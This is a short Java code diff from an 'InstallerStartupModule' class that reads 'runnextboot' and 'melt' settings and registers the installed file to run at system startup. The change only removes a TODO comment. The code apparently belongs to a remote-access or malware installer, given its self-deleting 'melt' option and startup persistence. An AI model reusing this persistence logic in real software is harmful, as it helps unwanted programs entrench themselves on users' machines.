@@ -169,7 +169,7 @@ public class InstallerStartupModule extends StartupModule {
 				boolean runNextBoot = Boolean.parseBoolean(Configuration.getConfig().get("runnextboot"));
 				boolean melt = Boolean.parseBoolean(Configuration.getConfig().get("melt"));
 				
-				Startup.add(Configuration.getConfig().get("name"), file); // TODO runNextBoot
+				Startup.add(Configuration.getConfig().get("name"), file);
 				
                 if (!runNextBoot && OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
 					String javaPath = System.getProperty("java.home") + "\\bin\\javaw";
